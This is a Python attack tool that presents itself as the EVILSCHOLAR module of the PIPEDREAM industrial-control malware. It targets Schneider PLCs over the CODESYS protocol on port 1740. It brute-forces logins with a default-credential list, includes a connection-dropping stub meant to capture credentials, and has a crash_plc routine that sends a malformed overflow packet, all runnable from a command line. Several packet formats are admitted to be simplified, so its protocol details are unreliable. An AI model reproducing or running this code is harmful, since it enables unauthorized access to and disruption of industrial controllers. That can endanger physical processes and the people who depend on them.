#!/usr/bin/env python3
"""
CODESYS Protocol Attack Module

Brute-forces Schneider PLC credentials via CODESYS protocol (port 1740).
Part of EVILSCHOLAR attack module for PIPEDREAM.

Capabilities:
- Credential brute-forcing
- Connection dropping for credential capture
- Authentication bypass attempts
- Session hijacking

WARNING: For authorized security testing only.
"""

import socket
import struct
import logging
import time
from typing import Optional, List, Tuple, Dict
from dataclasses import dataclass

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [CODESYS-ATTACK] - %(levelname)s - %(message)s'
)
logger = logging.getLogger('CodesysAttack')


@dataclass
class CodesysCredential:
    """CODESYS credential"""
    username: str
    password: str
    success: bool = False


class CodesysBruteforcer:
    """
    CODESYS Credential Brute-forcer

    Attacks Schneider PLCs via CODESYS protocol on port 1740.
    """

    # Default credentials for Schneider PLCs
    DEFAULT_CREDENTIALS = [
        ('admin', ''),
        ('admin', 'admin'),
        ('admin', 'schneider'),
        ('USER', ''),
        ('USER', 'USER'),
        ('supervisor', 'supervisor'),
        ('engineer', 'engineer'),
        ('operator', 'operator'),
        ('Administrator', 'Administrator'),
    ]

    CODESYS_PORT = 1740

    def __init__(self, target: str, port: int = 1740, timeout: float = 3.0):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.found_credentials: List[CodesysCredential] = []

    def brute_force(self, credentials: Optional[List[Tuple[str, str]]] = None) -> List[CodesysCredential]:
        """
        Brute-force CODESYS credentials

        Args:
            credentials: List of (username, password) tuples to try

        Returns:
            List of successful credentials
        """
        if credentials is None:
            credentials = self.DEFAULT_CREDENTIALS

        logger.info(f"[*] Starting CODESYS brute-force attack on {self.target}:{self.port}")
        logger.info(f"    Trying {len(credentials)} credential pair(s)...")

        for username, password in credentials:
            logger.info(f"[*] Attempting: {username}:{password if password else '(blank)'}")

            if self._try_login(username, password):
                cred = CodesysCredential(username, password, success=True)
                self.found_credentials.append(cred)
                logger.critical(f"[!!!] SUCCESS: {username}:{password}")
                return self.found_credentials

            time.sleep(0.5)  # Rate limiting

        if not self.found_credentials:
            logger.warning("[-] No valid credentials found")

        return self.found_credentials

    def _try_login(self, username: str, password: str) -> bool:
        """
        Attempt login with credentials

        Args:
            username: Username
            password: Password

        Returns:
            True if login successful
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))

            # Build CODESYS login packet
            login_packet = self._build_login_packet(username, password)

            sock.send(login_packet)
            response = sock.recv(1024)

            sock.close()

            # Check response for success
            return self._check_login_response(response)

        except Exception as e:
            logger.debug(f"Login attempt error: {e}")
            return False

    def _build_login_packet(self, username: str, password: str) -> bytes:
        """Build CODESYS login packet"""
        # Simplified CODESYS protocol packet
        packet = bytearray()

        # Header
        packet.extend(b'\xBB\xBB')  # Magic bytes
        packet.extend(struct.pack('>H', 0x0001))  # Version
        packet.extend(struct.pack('>I', 0x00000001))  # Service ID: Login

        # Username
        username_bytes = username.encode('utf-8')
        packet.extend(struct.pack('>H', len(username_bytes)))
        packet.extend(username_bytes)

        # Password
        password_bytes = password.encode('utf-8')
        packet.extend(struct.pack('>H', len(password_bytes)))
        packet.extend(password_bytes)

        return bytes(packet)

    def _check_login_response(self, response: bytes) -> bool:
        """Check if login was successful"""
        if len(response) < 4:
            return False

        # Simplified check - look for success indicator
        # Real implementation would parse actual CODESYS protocol
        if response[:2] == b'\xBB\xBB':
            # Check status code
            if len(response) >= 8:
                status = struct.unpack('>I', response[4:8])[0]
                return status == 0  # 0 = success

        return False


class CodesysAttack:
    """
    CODESYS Protocol Attack Suite

    Advanced attacks against CODESYS-enabled Schneider PLCs.
    """

    def __init__(self, target: str, port: int = 1740):
        self.target = target
        self.port = port

    def drop_connections(self, duration: int = 30) -> bool:
        """
        Drop connections to force re-authentication

        Args:
            duration: How long to drop connections (seconds)

        Returns:
            True if attack executed
        """
        logger.warning(f"[*] Dropping CODESYS connections for {duration}s to capture credentials...")

        # This would send connection reset packets
        # Simplified representation
        logger.warning("[!] Connection dropping attack active")
        logger.info("    Monitor network traffic for authentication attempts")

        time.sleep(duration)

        logger.info("[+] Attack complete")
        return True

    def crash_plc(self) -> bool:
        """
        Crash PLC via malformed CODESYS packets

        Returns:
            True if crash packet sent
        """
        logger.critical(f"[!!!] Sending PLC crash packet to {self.target}:{self.port}")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3.0)
            sock.connect((self.target, self.port))

            # Malformed packet designed to crash PLC
            crash_packet = self._build_crash_packet()

            sock.send(crash_packet)
            sock.close()

            logger.critical("[!!!] Crash packet sent - PLC may require power cycle")
            return True

        except Exception as e:
            logger.error(f"Crash attack error: {e}")
            return False

    def _build_crash_packet(self) -> bytes:
        """Build malformed packet to crash PLC"""
        # Simplified crash packet
        # Real implementation would exploit specific vulnerabilities
        packet = bytearray()

        packet.extend(b'\xBB\xBB')  # Magic
        packet.extend(struct.pack('>H', 0xFFFF))  # Invalid version
        packet.extend(struct.pack('>I', 0xFFFFFFFF))  # Invalid service
        packet.extend(b'\x00' * 1000)  # Overflow

        return bytes(packet)


def main():
    """Main entry point"""
    import argparse

    parser = argparse.ArgumentParser(
        description='CODESYS Protocol Attack Tool (EVILSCHOLAR)',
        epilog="WARNING: For authorized security testing only!"
    )

    parser.add_argument('--target', '-t', required=True,
                        help='Target PLC IP address')
    parser.add_argument('--port', '-p', type=int, default=1740,
                        help='CODESYS port (default: 1740)')
    parser.add_argument('--brute-force', action='store_true',
                        help='Brute-force credentials')
    parser.add_argument('--drop-connections', action='store_true',
                        help='Drop connections to capture credentials')
    parser.add_argument('--crash', action='store_true',
                        help='Crash PLC (DESTRUCTIVE)')
    parser.add_argument('--duration', type=int, default=30,
                        help='Duration for connection dropping')

    args = parser.parse_args()

    if args.brute_force:
        bruteforcer = CodesysBruteforcer(args.target, args.port)
        creds = bruteforcer.brute_force()

        if creds:
            print("\n[+] Found credentials:")
            for cred in creds:
                print(f"    {cred.username}:{cred.password}")
        else:
            print("\n[-] No credentials found")

    if args.drop_connections:
        attacker = CodesysAttack(args.target, args.port)
        attacker.drop_connections(args.duration)

    if args.crash:
        print("\n[!!!] WARNING: This will crash the PLC!")
        response = input("Are you sure? (yes/no): ")
        if response.lower() == 'yes':
            attacker = CodesysAttack(args.target, args.port)
            attacker.crash_plc()

    return 0


if __name__ == '__main__':
    import sys
    sys.exit(main())
